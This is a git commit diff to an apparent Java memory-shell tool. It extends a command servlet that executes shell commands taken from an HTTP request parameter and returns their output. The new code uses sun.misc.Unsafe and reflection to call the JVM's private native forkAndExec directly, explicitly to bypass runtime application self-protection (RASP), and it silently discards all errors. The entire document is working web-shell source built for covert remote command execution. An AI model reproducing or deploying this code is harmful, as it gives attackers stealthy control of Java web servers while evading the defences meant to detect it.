e59678188a382335b9e366c2e165c4c7f55a90a1
ReaJason <reajason1225@gmail.com>
2025-04-28 21:27:58 +0800

    feat: command unsafe bypass RASP

--- memshell/src/main/java/com/reajason/javaweb/memshell/shelltool/command/CommandServlet.java
+++ memshell/src/main/java/com/reajason/javaweb/memshell/shelltool/command/CommandServlet.java
@@ -1,5 +1,7 @@
 package com.reajason.javaweb.memshell.shelltool.command;
 
+import sun.misc.Unsafe;
+
 import javax.servlet.ServletException;
 import javax.servlet.ServletOutputStream;
 import javax.servlet.http.HttpServlet;
@@ -7,6 +9,8 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 
 /**
  * @author ReaJason
@@ -27,15 +31,84 @@ public class CommandServlet extends HttpServlet {
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         String cmd = getParam(request.getParameter(paramName));
-        if (cmd != null) {
-            Process exec = Runtime.getRuntime().exec(cmd);
-            InputStream inputStream = exec.getInputStream();
-            ServletOutputStream outputStream = response.getOutputStream();
-            byte[] buf = new byte[8192];
-            int length;
-            while ((length = inputStream.read(buf)) != -1) {
-                outputStream.write(buf, 0, length);
+        try {
+            if (cmd != null) {
+                InputStream inputStream = forkAndExec(cmd);
+                ServletOutputStream outputStream = response.getOutputStream();
+                byte[] buf = new byte[8192];
+                int length;
+                while ((length = inputStream.read(buf)) != -1) {
+                    outputStream.write(buf, 0, length);
+                }
             }
+        } catch (Exception ignored) {
+
         }
+    }
+
+    @SuppressWarnings("all")
+    public static InputStream forkAndExec(String cmd) throws Exception {
+        String[] strs = cmd.split("\\s+");
+        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+        theUnsafeField.setAccessible(true);
+        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+
+        Class<?> processClass = null;
+
+        try {
+            processClass = Class.forName("java.lang.UNIXProcess");
+        } catch (ClassNotFoundException e) {
+            processClass = Class.forName("java.lang.ProcessImpl");
+        }
+
+        Object processObject = unsafe.allocateInstance(processClass);
+
+        byte[][] args = new byte[strs.length - 1][];
+        int size = args.length;
+
+        for (int i = 0; i < args.length; i++) {
+            args[i] = strs[i + 1].getBytes();
+            size += args[i].length;
+        }
+
+        byte[] argBlock = new byte[size];
+        int i = 0;
+
+        for (byte[] arg : args) {
+            System.arraycopy(arg, 0, argBlock, i, arg.length);
+            i += arg.length + 1;
+        }
+
+        int[] envc = new int[1];
+        int[] std_fds = new int[]{-1, -1, -1};
+        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
+        Field helperpathField = processClass.getDeclaredField("helperpath");
+        launchMechanismField.setAccessible(true);
+        helperpathField.setAccessible(true);
+        Object launchMechanismObject = launchMechanismField.get(processObject);
+        byte[] helperpathObject = (byte[]) helperpathField.get(processObject);
+        int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+
+        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
+                byte[].class, int.class, byte[].class, int[].class, boolean.class);
+        forkMethod.setAccessible(true);
+
+        byte[] bytes = strs[0].getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0,
+                result, 0,
+                bytes.length);
+        result[result.length - 1] = (byte) 0;
+
+        forkMethod.invoke(processObject, ordinal + 1, helperpathObject, result, argBlock, args.length,
+                null, envc[0], null, std_fds, false);
+
+        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
+        initStreamsMethod.setAccessible(true);
+        initStreamsMethod.invoke(processObject, std_fds);
+
+        Method getInputStreamMethod = processClass.getMethod("getInputStream");
+        getInputStreamMethod.setAccessible(true);
+        return (InputStream) getInputStreamMethod.invoke(processObject);
     }
 }
